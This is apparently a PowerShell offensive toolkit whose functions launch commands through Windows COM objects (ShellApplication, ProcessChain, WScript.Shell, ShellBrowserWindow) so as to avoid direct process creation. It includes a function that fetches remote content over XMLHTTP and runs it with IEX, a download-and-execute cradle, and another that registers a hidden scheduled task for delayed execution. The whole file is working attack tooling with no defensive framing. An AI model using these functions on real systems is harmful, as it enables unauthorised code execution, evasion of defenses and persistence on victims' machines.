function Invoke-COM-ShellApplication {

	param(
		[Parameter(Mandatory=$True)]
		[string]$Command,
		[Parameter(Mandatory=$True)]
		[string]$Argument
	)

	BEGIN {
		$GUID = "13709620-C279-11CE-A49E-444553540000"
		Write-Output "[+] Executing ShellApplication COM object"
	}
	
	PROCESS {
		$Instance = [activator]::CreateInstance([type]::GetTypeFromCLSID($GUID))
		$Instance.ShellExecute($Command, $Argument, "", "", 0)
	}
	
	END {
		Write-Output "[+] Process Completed"
	}
}

function Invoke-COM-ProcessChain {

	param(
		[Parameter(Mandatory=$True)]
		[string]$Command,
		[Parameter(Mandatory=$True)]
		[string]$Argument
	)

	BEGIN {
		$GUID = "E430E93D-09A9-4DC5-80E3-CBB2FB9AF28E"
		Write-Output "[+] Executing ProcessChain COM object"
	}
	
	PROCESS {
		$Instance = [activator]::CreateInstance([type]::GetTypeFromCLSID($GUID))
		$Instance.ExecutablePath = $Command
		$Instance.CommandLine = $Argument
		$Instance.Start([ref]$True)

	}
	
	END {
		Write-Output "[+] Process Completed"
	}
}

function Invoke-COM-WindowsScriptHost {

	param(
		[Parameter(Mandatory=$True)]
		[string]$Command,
		[Parameter(Mandatory=$True)]
		[string]$Argument
	)

	BEGIN {
		$GUID = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"
		Write-Output "[+] Executing WindowsScriptHost COM object"
	}
	
	PROCESS {
		$Instance = [activator]::CreateInstance([type]::GetTypeFromCLSID($GUID))
		$Instance.Run($Command + " " + $Argument)
	}
	
	END {
		Write-Output "[+] Process Completed"
	}
}

function Invoke-COM-ShellBrowserWindow {

	param(
		[Parameter(Mandatory=$True)]
		[string]$Command
	)

	BEGIN {
		$GUID = "C08AFD90-F2A1-11D1-8455-00A0C91F3880"
		Write-Output "[+] Executing ShellBrowserWindow COM object"
	}
	
	PROCESS {
		$Instance = [activator]::CreateInstance([type]::GetTypeFromCLSID($GUID))
		$Instance.Navigate($Command)
	}
	
	END {
		Write-Output "[+] Process Completed"
	}
}

function Invoke-COM-XMLHTTP {

	param(
		[Parameter(Mandatory=$True)]
		[string]$Path,
		[Parameter(Mandatory=$False)]
		[switch]$Execute = $False
	)

	BEGIN {
		$GUID = "F5078F35-C551-11D3-89B9-0000F81FE221"
		Write-Output "[+] Executing XML HTTP COM object"
	}
	
	PROCESS {
		$Instance = [activator]::CreateInstance([type]::GetTypeFromCLSID($GUID))
		$Instance.Open("GET", $Path, $False)
		$Instance.Send()
		$Data = $Instance.responseText

		if($Execute) {
			IEX $Data
		}
		return $Data
	}
	
	END {
		Write-Output "[+] Process Completed"
	}
}

function Invoke-COM-ScheduleService {

	param(
		[Parameter(Mandatory=$True)]
		[string]$Command,
		[Parameter(Mandatory=$True)]
		[string]$Argument,
		[Parameter(Mandatory=$False)]
		[int]$Delay = 30
	)

	BEGIN {
		$ProgID = "Schedule.Service"
		$TaskName = [Guid]::NewGuid().ToString()
		Write-Output "[+] Executing ScheduleService COM object"
		Write-Output "[+] Task name $($TaskName)"
	}
	
	PROCESS {
		$TaskName = [Guid]::NewGuid().ToString()
		$Instance = [activator]::CreateInstance([type]::GetTypeFromProgID($ProgID))
		$Instance.Connect()
		$Folder = $Instance.GetFolder("\")
		$Task = $Instance.NewTask(0)
		$Trigger = $Task.triggers.Create(0)
		$Trigger.StartBoundary = Convert-Date -Date ((Get-Date).addSeconds($Delay))
		$Trigger.EndBoundary = Convert-Date -Date ((Get-Date).addSeconds($Delay + (60 * 60)))
		$Trigger.ExecutionTimelimit = "PT5M"
		$Trigger.Enabled = $True
		$Trigger.Id = $Taskname
		$Action = $Task.Actions.Create(0)
		$Action.Path = $Command
		$Action.Arguments = $Argument
		$Action.HideAppWindow = $True
		$Folder.RegisterTaskDefinition($TaskName, $Task, 6, "", "", 3)
	}
	
	END {
		Write-Output "[+] Process Completed"
	}
}

function Convert-Date {
	
	param(
	[datetime]$Date
	)
	
	PROCESS {
		$Date.Touniversaltime().tostring("u") -replace " ","T"
	}
}
